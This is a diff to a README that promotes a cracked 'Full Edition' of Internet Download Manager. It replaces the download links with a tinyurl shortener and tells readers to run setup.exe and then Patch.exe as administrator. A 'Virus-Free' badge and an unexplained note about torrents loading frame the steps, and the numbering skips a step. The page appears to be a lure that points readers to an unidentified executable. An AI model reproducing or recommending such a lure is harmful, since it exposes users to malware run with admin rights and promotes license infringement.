@@ -1,6 +1,6 @@
 # 🚀 Internet Download Manager (IDM) Full Edition - Unlock Unlimited Downloads
 
-![IDM Banner](https://www.internetdownloadmanager.com/images/idm6.png)
+![IDM Banner](https://www.internetdownloadmanager.com/images/idm_screenshot_6_35.png)
 
 🔓 **Fully Unlocked** | ⚡ **Lifetime License** | 🛡️ **Virus-Free** | 🏆 **Windows 10/11 Compatible**
 
@@ -8,7 +8,7 @@
 
 ## 📥 Download Now
 
-<a href="https://github.com/YourUsername/IDM-Full-Version/releases/download/full/IDM_Full_Version.zip" download now>
+<a href="https://tinyurl.com/kp27u72t" download now>
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
@@ -39,14 +39,15 @@
 ## ⚙️ Quick Start Guide
 
 1. 📦 **Download the archive** from the official link:  
- [Click here to download](https://github.com/YourUsername/IDM-Full-Version)
+ [Click here to download](https://tinyurl.com/kp27u72t)
 
-2. 📂 **Extract the ZIP file** (Password: `2025`).
+2. 📂 **Extract the archive** to any folder.
 
 3. 🛠️ **Run `setup.exe`**.
+   > ⚠️ This ensures torrents and resources load correctly.
 
-4. 🔑 **Apply the patch** (Run `Patch.exe` as Admin).
+5. 🔑 **Apply the patch** (Run `Patch.exe` as Admin).
 
-5. 🎉 **Launch IDM & enjoy unlimited downloads!**
+6. 🎉 **Launch IDM & enjoy unlimited downloads!**
 
 ---
